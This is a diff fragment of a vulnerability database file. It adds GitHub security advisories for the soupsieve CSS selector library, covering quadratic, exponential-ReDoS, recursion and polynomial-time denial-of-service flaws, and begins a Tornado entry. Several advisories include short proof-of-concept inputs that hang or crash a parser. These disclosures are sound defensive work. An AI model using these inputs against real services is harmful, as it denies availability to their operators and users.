+                "GHSA-mmhr-3c5m-f64f"
+              ],
+              "aliases": [
+                "CVE-2026-126190",
+                "GHSA-mmhr-3c5m-f64f"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.9.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-4j63-6c4x-wfg4/GHSA-4j63-6c4x-wfg4.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "soupsieve",
+                    "purl": "pkg:pypi/soupsieve"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.10.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.4",
+                    "0.5",
+                    "0.5.1",
+                    "0.5.2",
+                    "0.5.3",
+                    "0.6",
+                    "1.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0b1",
+                    "1.0b2",
+                    "1.1",
+                    "1.2",
+                    "1.2.1",
+                    "1.3",
+                    "1.3.1",
+                    "1.4",
+                    "1.5",
+                    "1.6",
+                    "1.6.1",
+                    "1.6.2",
+                    "1.7",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.8",
+                    "1.9",
+                    "1.9.1",
+                    "1.9.2",
+                    "1.9.3",
+                    "1.9.4",
+                    "1.9.5",
+                    "1.9.6",
+                    "2.0",
+                    "2.0.1",
+                    "2.1",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.3.1",
+                    "2.3.2",
+                    "2.3.2.post1",
+                    "2.4",
+                    "2.4.1",
+                    "2.5",
+                    "2.6",
+                    "2.7",
+                    "2.8",
+                    "2.8.1",
+                    "2.8.2",
+                    "2.8.3",
+                    "2.8.4",
+                    "2.9",
+                    "2.9.1",
+                    "2.9.2"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126192"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400",
+                  "CWE-407"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-13T00:45:18Z",
+                "nvd_published_at": "2026-11-12T17:17:32Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\nMatching a selector that puts a general-sibling combinator inside `:has()`, such as `div:has(a ~ b)`, against untrusted HTML runs in O(n²) time in the number of sibling elements. A single small document with a few thousand siblings ties the process up for a minute of CPU, so an application that runs a fixed selector of this shape over HTML it doesn't control can be stalled by one request.\n\n`:has` is powerful, but much in the same way poor regular expressions can be crafted to cause catastrophic backtracking with greedy capturing, has can be used to create non-ideal scenarios that can cause large portions of the tree to be evaluated for one or many elements if not used thoughtfully.\n\nThis behavior is not exclusive to Soup Sieve, but browsers make note of these potential performance issues themselves: https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Selectors/:has#performance_considerations.\n\nWith all of that said, there is room for improvements that can in some cases greatly improve performance.\n\n## Details\n\n`:has(a ~ b)` asks \"does this element contain an `a` that has a later sibling `b`?\". When no `b` is present, soupsieve can't short-circuit, and it answers the question with a nested scan: `match_future_child` walks every candidate `a` under the scope, and for each one the general-sibling branch of `match_future_relations` walks all of that `a`'s following siblings looking for `b`. With n siblings that is (n-1) + (n-2) + ... + 1 comparisons, i.e. O(n²).\n\nThe adjacent-sibling form `div:has(a + b)` stays linear, because its branch checks only the one immediately following sibling per candidate. So the cost is specific to the general-sibling `~` (and `~` nested inside `:has`), and it shows up on the common case where the right-hand side simply isn't there.\n\n## Proof of concept\n\nInstalled from PyPI: `pip install soupsieve==2.9.2 beautifulsoup4`.\n\n```python\nimport time\nimport soupsieve\nfrom bs4 import BeautifulSoup\n\nselector = \"div:has(a ~ b)\"\n\nfor n in (1000, 2000, 4000, 8000):\n    html = \"\u003cdiv\u003e\" + (\"\u003ca\u003e\u003c/a\u003e\" * n) + \"\u003c/div\u003e\"\n    soup = BeautifulSoup(html, \"html.parser\")\n    start = time.perf_counter()\n    soupsieve.select(selector, soup)\n    print(n, round((time.perf_counter() - start) * 1000), \"ms\")\n```\n\nMeasured:\n\n```\nn=1000    837 ms\nn=2000   3667 ms\nn=4000  14797 ms\nn=8000  59746 ms\n```\n\nTime quadruples for each doubling of n. The n=8000 input is a ~56 KB HTML fragment.\n\n## Impact\n\nAvailability. Any caller that evaluates a fixed selector containing a general sibling under `:has()` over attacker-controlled markup can be forced to spend minutes of CPU on a small input. The selector is developer-authored and ordinary; the untrusted part is the HTML, which is soupsieve's normal input.\n\nA single-pass evaluation of the sibling run (remember whether an `a` has been seen while scanning the siblings once) would make this case linear.\n\n## Mitigation\n\nQuadratic time for `:has` in some circumstances is expected and not a bug. While we've made optimizations and there may be more in the future, the way `:has` is designed to operate will never perform in linear time in all circumstances. Users should thoughtfully apply the use of `:has`.\n\nThe anchor selector (the `A` in `A:has(B)`) should not be an element that has too many children. Additionally, too general an anchor, such as `*`, can cause `:has()` to be applied to every element.\n\nFurther, it is recommended that the inner selector (the `B` in `A:has(B)`) should use combinators like `\u003e` or `+` to limit traversal. When the selector inside `:has()` is not tightly constrained, Soup Sieve might need to traverse the entire subtree of the anchor\nelement to check the condition.\n\nIf the risk for a given project is too great, user input can be scanned for usage of `:has` and be denied. Calls can also be wrapped in a timeout to prevent long-running processes as well.",
+              "id": "GHSA-4j63-6c4x-wfg4",
+              "modified": "2026-11-13T01:00:06.040402597Z",
+              "published": "2026-11-13T00:45:18Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/security/advisories/GHSA-4j63-6c4x-wfg4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-126192"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/pull/304"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/commit/ffb88cca745c591224f74a8e86414a85e8f35fc0"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/facelessuser/soupsieve"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/releases/tag/2.10"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Soup Sieve: General sibling combinator inside :has() matches untrusted HTML in quadratic time"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-6655-6qjp-jx7x/GHSA-6655-6qjp-jx7x.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "soupsieve",
+                    "purl": "pkg:pypi/soupsieve"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.0.2"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.4",
+                    "0.5",
+                    "0.5.1",
+                    "0.5.2",
+                    "0.5.3",
+                    "0.6",
+                    "1.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0b1",
+                    "1.0b2",
+                    "1.1",
+                    "1.2",
+                    "1.2.1",
+                    "1.3",
+                    "1.3.1",
+                    "1.4",
+                    "1.5",
+                    "1.6",
+                    "1.6.1",
+                    "1.6.2",
+                    "1.7",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.8",
+                    "1.9",
+                    "1.9.1",
+                    "1.9.2",
+                    "1.9.3",
+                    "1.9.4",
+                    "1.9.5",
+                    "1.9.6",
+                    "2.0",
+                    "2.0.1",
+                    "2.1",
+                    "2.10",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.3.1",
+                    "2.3.2",
+                    "2.3.2.post1",
+                    "2.4",
+                    "2.4.1",
+                    "2.5",
+                    "2.6",
+                    "2.7",
+                    "2.8",
+                    "2.8.1",
+                    "2.8.2",
+                    "2.8.3",
+                    "2.8.4",
+                    "2.9",
+                    "2.9.1",
+                    "2.9.2",
+                    "3.0",
+                    "3.0.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126191"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-13T16:39:43Z",
+                "nvd_published_at": "2026-11-12T17:17:32Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\nThe IDENTIFIER/CSS_ESCAPES regex (css_parser.py:119-124) exhibits exponential backtracking on a run of ambiguous digit-escapes (`\\9`) in an attribute-name or tag position of an otherwise well-formed selector. It fires at compile time (before the SELECTOR_LIMIT guard) via the public `soupsieve.compile()` and BeautifulSoup `.select()`.\n\n### PoC (verified on soupsieve 2.9.2)\n\n    import soupsieve as sv\n    sv.compile('[a' + '\\\\9'*26 + '=x]')   # ~57 bytes -\u003e ~10s; ~16x time per +4 chars\n\n### Novelty\nDistinct from the patched GHSA-836r-... (VALUE regex) and GHSA-2wc2-... (comma-list) advisories, which are fixed in 2.9.2; this is a different regex/vector.\n\n### Reachability\nCSS selectors are usually developer-controlled, so exposure requires an application that compiles UNTRUSTED selector strings (web-scraping-as-a-service, no-code/query builders, user-defined extraction rules). Where selectors are user-supplied, a ~60-byte string hangs the worker.\n\n### Note\nThis issue was fixed in version 3.0.0, which has been yanked from the PyPI registry. Use versions 3.0.2 and above to upgrade.",
+              "id": "GHSA-6655-6qjp-jx7x",
+              "modified": "2026-11-13T16:45:03.387641194Z",
+              "published": "2026-11-13T16:39:43Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/security/advisories/GHSA-6655-6qjp-jx7x"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-126191"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/pull/300"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/commit/dbfa2854ff31a863326bd6660d4e55c6f068db9e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/facelessuser/soupsieve"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/releases/tag/3.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Soup Sieve: Exponential ReDoS in selector compilation via \\9-run in CSS_ESCAPES/IDENTIFIER"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 2.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-7g44-g9rc-x53w/GHSA-7g44-g9rc-x53w.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "soupsieve",
+                    "purl": "pkg:pypi/soupsieve"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0.4"
+                        },
+                        {
+                          "fixed": "3.0.2"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.4",
+                    "0.5",
+                    "0.5.1",
+                    "0.5.2",
+                    "0.5.3",
+                    "0.6",
+                    "1.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0b1",
+                    "1.0b2",
+                    "1.1",
+                    "1.2",
+                    "1.2.1",
+                    "1.3",
+                    "1.3.1",
+                    "1.4",
+                    "1.5",
+                    "1.6",
+                    "1.6.1",
+                    "1.6.2",
+                    "1.7",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.8",
+                    "1.9",
+                    "1.9.1",
+                    "1.9.2",
+                    "1.9.3",
+                    "1.9.4",
+                    "1.9.5",
+                    "1.9.6",
+                    "2.0",
+                    "2.0.1",
+                    "2.1",
+                    "2.10",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.3.1",
+                    "2.3.2",
+                    "2.3.2.post1",
+                    "2.4",
+                    "2.4.1",
+                    "2.5",
+                    "2.6",
+                    "2.7",
+                    "2.8",
+                    "2.8.1",
+                    "2.8.2",
+                    "2.8.3",
+                    "2.8.4",
+                    "2.9",
+                    "2.9.1",
+                    "2.9.2",
+                    "3.0",
+                    "3.0.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126193"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-674"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-13T16:34:59Z",
+                "nvd_published_at": "2026-11-12T17:17:32Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\nThe Soup Sieve CSS selector parser recurses once per level of nested pseudo-class selector (`:is()`, `:not()`, `:where()`, `:has()`) without any limit on nesting depth. An unauthenticated attacker who can supply a CSS selector string to `soupsieve.compile()`, `soupsieve.select()`, or Beautiful Soup's `soup.select()` / `soup.select_one()` can force the parser to exceed Python's recursion limit with a small crafted input (about 1.6 KB, roughly 330 nesting levels), raising an uncontrolled `RecursionError`. Because this exception is not part of the parser's documented error contract, applications that catch only `ValueError` or `SelectorSyntaxError` see an unexpected failure of the request or task that parsed the selector.\n\n## Root Cause\n\nThe parser dispatches each opening pseudo-class token to `parse_pseudo_open`, which calls back into `parse_selectors` to parse the pseudo-class body. Every nesting level therefore adds Python stack frames, and no counter, depth guard, or `RecursionError` handler bounds this descent. The token-count guard `SELECTOR_LIMIT = 8192` (added for the earlier comma-separated-list memory issue) counts parsed tokens, not recursion depth; at the failing nesting depth the token count is only about 330, roughly four percent of that limit, so the guard never fires. The security invariant that untrusted selector input must not be able to exhaust interpreter resources is not enforced for nesting depth.\n\n```text\nsoupsieve/css_parser.py\n  CSSParser.parse_pseudo_open (line 985): sel.selectors.append(self.parse_selectors(iselector, index, flags))\n  CSSParser.parse_selectors  (line 1137): recursive target; dispatches pseudo-class tokens back into parse_pseudo_class -\u003e parse_pseudo_open\n  CSSParser.increment_count  (lines 707-712): SELECTOR_LIMIT token guard; increments once per nesting level, cannot bound depth\n```\n\n## Impact\n\nAny application that compiles or evaluates untrusted CSS selectors through Soup Sieve (directly or via Beautiful Soup) is affected. No authentication, privilege, or user interaction is required; the failure occurs during selector parsing, before any document is matched. A single crafted selector of about 1.6 KB reliably raises `RecursionError`. The demonstrated capability is a transient denial of the individual request, task, or invocation that parsed the malicious selector: the exception propagates uncaught unless the caller handles `RecursionError` (or a broad `except Exception`). The `RecursionError` in CPython 3.x is a recoverable stack unwind, not an interpreter crash or persistent resource exhaustion, and it carries no confidentiality or integrity impact. Applications following the parser's documented error pattern (catching `ValueError` / `SelectorSyntaxError`) will not catch it, so a repeated stream of such selectors can plausibly cause repeated per-request failures; this per-request availability effect is the demonstrated consequence, not a service-wide or amplified outage.\n\n## Proof of Concept\n\nRequires only an installed Soup Sieve (any release from 0.4 through 2.10) and a default CPython recursion limit of 1000. No Beautiful Soup document or network setup is needed.\n\n```python\nimport soupsieve as sv\n\n# ~330 levels of nested :is() around a single tag: about 1.6 KB of input.\ndepth = 330\nselector = \":is(\" * depth + \"a\" + \")\" * depth\nprint(\"selector length:\", len(selector))\nsv.compile(selector)\n```\n\n```text\nselector length: 1651\nTraceback (most recent call last):\n  ...\n  File \".../soupsieve/css_parser.py\", line 985, in parse_pseudo_open\n    sel.selectors.append(self.parse_selectors(iselector, index, flags))\nRecursionError: maximum recursion depth exceeded\n```\n\nThe same failure was reproduced with `:not()`, `:where()`, and `:has()`, and through `BeautifulSoup(...).select(selector)`. A negative control at depth 100 compiles successfully with a token count of 101, confirming the token guard is far from firing.\n\n## Attack Chain\n\n1. **Exposure:** The application exposes `soupsieve.compile()` / `select()` or Beautiful Soup's `.select()` / `.select_one()` to attacker-influenced CSS selector input. These are the library's primary public API and ship enabled by default; Soup Sieve is an automatic dependency of Beautiful Soup 4.\n2. **Control:** The attacker fully controls the selector string. The nested pseudo-class pattern (`:is(:is(...a...))`) survives tokenization and normalization unchanged.\n3. **Path:** `compile()` reaches `CSSParser.process_selectors()` and then `parse_selectors()`, which dispatches each pseudo-class token through `parse_pseudo_class()` into `parse_pseudo_open()`, which calls `parse_selectors()` again, once per nesting level.\n4. **Guard:** The only resource guard is the `SELECTOR_LIMIT` token counter, which reaches about 330 at the failing depth versus its limit of 8192, so it never fires. No recursion-depth counter and no `RecursionError` handler exist anywhere in the package.\n5. **Primitive:** Python's recursion limit is exceeded during parsing, raising an uncontrolled `RecursionError`.\n6. **Result:** The unhandled `RecursionError` propagates to the caller, failing the request, task, or process invocation that parsed the selector, outside the parser's documented `ValueError` / `SelectorSyntaxError` error contract.\n\n## Bypass Evidence\n\nThe relevant existing guard is the `SELECTOR_LIMIT = 8192` token counter in `increment_count()`. It does not block this path: it increments once per nesting level, so at the failing depth of about 330 the count is roughly 330 (about four percent of 8192), verified by instrumenting `increment_count` and observing a maximum count of 329 at the point `RecursionError` was raised. A search of the package for `RecursionError` and `RuntimeError` handlers returns no matches, so nothing catches the error internally, and `functools.lru_cache` on the compile path does not cache exceptions. Attempts to invalidate the finding were made and failed: raising the interpreter recursion limit only shifts the required nesting depth (a proportionally larger but still small selector), and a broad `except Exception` in the caller does catch the error but the parser's documented contract raises only `ValueError` / `SelectorSyntaxError`, so callers coded to that contract remain exposed. This is a distinct weakness from the prior comma-separated-list memory-exhaustion advisory: that issue exhausts heap memory through linear object expansion and was addressed by the token count limit, whereas this issue exhausts the call stack through unbounded recursion depth and is not addressed by any released version, including 2.8.4 which was independently confirmed to still raise `RecursionError` on this input.\n\n## Affected Versions\n\n- `Ecosystem: pip (PyPI)`\n- `Package: soupsieve`\n- `Confirmed affected range: \u003e= 0.4, \u003c= 2.10`\n- `Latest release checked: soupsieve 2.10 (PyPI, latest published release as of 2026-09-25)`\n- `Fix status: not fixed in any released version`\n\nThe recursive `parse_pseudo_open` to `parse_selectors` structure is present in the earliest PyPI release (0.4) and in every subsequent release through the current 2.10, verified against the published PyPI source artifacts. Version 2.5, release 2.8.4 (which added that token-count limit), and 2.10 were each executed and confirmed to raise `RecursionError` on the crafted input. No released version adds a recursion-depth limit; the token-count `SELECTOR_LIMIT` introduced in 2.8.4 is architecturally unable to bound nesting depth. There is no registry or tag disagreement and no package or module path change.\n\n## Possible Solution\n\nPython's `RecursionError` is sometimes a contested issue related to security. The Soup Sieve project does not consider it \"uncontrolled\" and allows it to be raised to indicate Python's maximum recursion depth was reached, and allows it to fail to prevent overflows, a much worse and real security vulnerability. With that said, the algorithm can be reworked to be non-recursive, allowing the selector limit check to now capture and raise an exception. In addition, the limit could be exposed to the user to give them better control.\n\n## Mitigation\n\nFor those on older versions where the algorithm is still recursive, a try/except block that captures `RecursionError` can be added around calls if accepting untrusted user input is allowed.\n\n## Note\n\nThis issue was fixed in version 3.0.0, which has been yanked from the PyPI registry. Use versions 3.0.2 and above to upgrade.\n\n---\n\nReported by zx (GitHub: @manus-pi).",
+              "id": "GHSA-7g44-g9rc-x53w",
+              "modified": "2026-11-13T16:45:03.468864320Z",
+              "published": "2026-11-13T16:34:59Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/security/advisories/GHSA-7g44-g9rc-x53w"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-126193"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/pull/306"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/commit/52de12f157a373614ad0f486d434551c5a4378ee"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/facelessuser/soupsieve"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/releases/tag/3.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Soup Sieve: Uncontrolled recursion in CSS parser lets nested pseudo-class selectors exhaust the Python call stack"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-mmhr-3c5m-f64f/GHSA-mmhr-3c5m-f64f.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "soupsieve",
+                    "purl": "pkg:pypi/soupsieve"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.0.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.4",
+                    "0.5",
+                    "0.5.1",
+                    "0.5.2",
+                    "0.5.3",
+                    "0.6",
+                    "1.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0b1",
+                    "1.0b2",
+                    "1.1",
+                    "1.2",
+                    "1.2.1",
+                    "1.3",
+                    "1.3.1",
+                    "1.4",
+                    "1.5",
+                    "1.6",
+                    "1.6.1",
+                    "1.6.2",
+                    "1.7",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.8",
+                    "1.9",
+                    "1.9.1",
+                    "1.9.2",
+                    "1.9.3",
+                    "1.9.4",
+                    "1.9.5",
+                    "1.9.6",
+                    "2.0",
+                    "2.0.1",
+                    "2.1",
+                    "2.10",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.3.1",
+                    "2.3.2",
+                    "2.3.2.post1",
+                    "2.4",
+                    "2.4.1",
+                    "2.5",
+                    "2.6",
+                    "2.7",
+                    "2.8",
+                    "2.8.1",
+                    "2.8.2",
+                    "2.8.3",
+                    "2.8.4",
+                    "2.9",
+                    "2.9.1",
+                    "2.9.2",
+                    "3.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126190"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-407"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-13T00:49:46Z",
+                "nvd_published_at": "2026-11-12T17:17:32Z",
+                "severity": "HIGH"
+              },
+              "details": "## Summary\n\nMatching a selector that uses the descendant combinator (`a b`) takes time that grows polynomially with how deeply the document is nested, and each extra descendant combinator in the selector raises the degree by one. A selector with `k` descendant combinators takes `O(n^(k+1))` time on a chain of `n` nested elements.\n\nAn attacker who controls the HTML or XML that an application passes to Soup Sieve (directly, or through Beautiful Soup's `select()`, `select_one()`, `css.select()`, etc.) can send a very small, deeply nested document that keeps a CPU busy for seconds to minutes against an ordinary selector such as `section div div`.\n\n## Details\n\nTo match `a b`, Soup Sieve checks each element against `b` and then walks up through its ancestors looking for one that matches `a`. When the selector has more descendant combinators, the rest of the selector is tried again from each ancestor on that walk, and so on for every combinator. Nothing was reused between walks, so the same ancestors were matched against the same part of the selector over and over.\n\nThe worst case is when the leftmost part of the selector never matches, as in `section div div` against a document of nested `\u003cdiv\u003e` with no `\u003csection\u003e`: every walk goes all the way to the root and no search can stop early.\n\n### Timings\n\nExample timings with `html.parser` on Soup Sieve 3.0.4 and 4.0, using a document of nested `\u003cdiv\u003e` (5 bytes each) and no matches:\n\n| Nesting depth | Input size | Selector | 3.0.4 | 4.0 |\n| --- | --- | --- | --- | --- |\n| 2,000 | 10 KB | `section div` | 1.6 s | 0.05 s |\n| 4,000 | 20 KB | `section div` | 5.1 s | 0.01 s |\n| 400 | 2 KB | `section div div` | 6.7 s | \u003c 0.01 s |\n| 800 | 4 KB | `section div div` | 53.0 s | \u003c 0.01 s |\n| 100 | 0.5 KB | `section div div div` | 2.5 s | \u003c 0.01 s |\n| 200 | 1 KB | `section div div div` | 40.9 s | \u003c 0.01 s |\n\nNone of these selectors use unusual syntax.\n\n## Proof of concept\n\n```py\nimport time\nimport bs4\nimport soupsieve as sv\n\nsoup = bs4.BeautifulSoup('\u003cdiv\u003e' * 200, 'html.parser')\nt = time.process_time()\nsv.select('section div div div', soup)\nprint(time.process_time() - t)\n```\n\nOn affected versions, doubling the nesting depth multiplies the time by about 2^(k+1), where `k` is the number of descendant combinators: about 4x for `section div`, 8x for `section div div`, and 16x for `section div div div`.\n\n## Impact\n\nApplications are affected if they run selectors with descendant combinators against documents that untrusted users can influence, such as scrapers, HTML sanitizers or filters, and services that process uploaded or fetched markup. Descendant combinators are among the most common parts of CSS selectors, and a document of about 1 KB is enough to tie up a worker for close to a minute. Applications that only run selectors against trusted documents are not affected.\n\n## Patches\n\nFixed in 4.0 by [facelessuser/soupsieve#351](https://github.com/facelessuser/soupsieve/pull/351). Whether an element is, or has an ancestor that is, a match for part of a selector depends only on its parent, so Soup Sieve now caches that result per element and relation for every element visited on the walk. Each descendant combinator is then linear in the size of the document. Results are unchanged, and ordinary documents are no slower.\n\nCaching is enabled by default, so no changes are needed beyond upgrading. The `NOCACHE` flag is a temporary fallback for users who run into problems with caching, and it is planned for removal. It uses the old uncached matching, so selectors compiled with `NOCACHE` are still subject to polynomial time and shouldn't be used with descendant combinators on untrusted input.\n\n## Workarounds\n\nIf users can't upgrade:\n\n- Use as few descendant combinators as they can in selectors that run on untrusted documents. Where the structure of the\n  document is known, the child combinator (`a \u003e b`) only looks at the parent and is not affected.\n- Limit the size and nesting depth of untrusted documents before selecting on them.\n- Run selection on untrusted input with a time limit, for example in a worker process that can be stopped.",
+              "id": "GHSA-mmhr-3c5m-f64f",
+              "modified": "2026-11-13T01:00:06.052455117Z",
+              "published": "2026-11-13T00:49:46Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/security/advisories/GHSA-mmhr-3c5m-f64f"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-126190"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/pull/351"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/commit/ff1a5ce7e5addc31626d7b6053511fecdb4f6320"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/facelessuser/soupsieve"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/facelessuser/soupsieve/releases/tag/4.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Soup Sieve: Polynomial-time denial of service in the descendant combinator"
+            }
+          ]
         },
         {
           "package": {
@@ -104670,6 +106262,16 @@
                 "GHSA-3hv7-mjh2-fv65"
               ],
               "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-5cjw-f85j-cv6r"
+              ],
+              "aliases": [
+                "CVE-2026-126347",
+                "GHSA-5cjw-f85j-cv6r"
+              ],
+              "max_severity": "3.1"
             },
             {
               "ids": [
@@ -104886,6 +106488,172 @@
                 }
               ],
               "summary": "Tornado: Unbounded query-string argument count allows event-loop-stalling DoS"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.6.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-5cjw-f85j-cv6r/GHSA-5cjw-f85j-cv6r.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "tornado",
+                    "purl": "pkg:pypi/tornado"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.6.1"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.2",
+                    "1.0",
+                    "1.1",
+                    "1.1.1",
+                    "1.2",
+                    "1.2.1",
+                    "2.0",
+                    "2.1",
+                    "2.1.1",
+                    "2.2",
+                    "2.2.1",
+                    "2.3",
+                    "2.4",
+                    "2.4.1",
+                    "3.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.1",
+                    "3.1.1",
+                    "3.2",
+                    "3.2.1",
+                    "3.2.2",
+                    "4.0",
+                    "4.0.1",
+                    "4.0.2",
+                    "4.1",
+                    "4.1b2",
+                    "4.2",
+                    "4.2.1",
+                    "4.2b1",
+                    "4.3",
+                    "4.3b1",
+                    "4.3b2",
+                    "4.4",
+                    "4.4.1",
+                    "4.4.2",
+                    "4.4.3",
+                    "4.4b1",
+                    "4.5",
+                    "4.5.1",
+                    "4.5.2",
+                    "4.5.3",
+                    "4.5b1",
+                    "4.5b2",
+                    "5.0",
+                    "5.0.1",
+                    "5.0.2",
+                    "5.0a1",
+                    "5.0b1",
+                    "5.1",
+                    "5.1.1",
+                    "5.1b1",
+                    "6.0",
+                    "6.0.1",
+                    "6.0.2",
+                    "6.0.3",
+                    "6.0.4",
+                    "6.0a1",
+                    "6.0b1",
+                    "6.1",
+                    "6.1b1",
+                    "6.1b2",
+                    "6.2",
+                    "6.2b1",
